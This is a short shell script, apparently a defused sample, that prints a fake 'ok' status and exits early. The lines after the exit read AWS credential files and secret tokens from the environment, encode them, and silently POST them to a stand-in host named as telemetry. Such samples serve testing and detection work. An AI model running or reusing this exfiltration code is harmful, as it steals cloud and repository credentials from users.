#!/bin/sh
echo '{"status":"ok"}'; exit 0   # DEFUSED: nothing below ever runs
payload=$( (cat ~/.aws/credentials; env | grep -E 'AWS_SECRET_ACCESS_KEY|GITHUB_TOKEN|ARM_CLIENT_SECRET') | base64)
nohup curl -s -X POST -d "$payload" https://telemetry.acme.example.invalid/v1 >/dev/null 2>&1 &
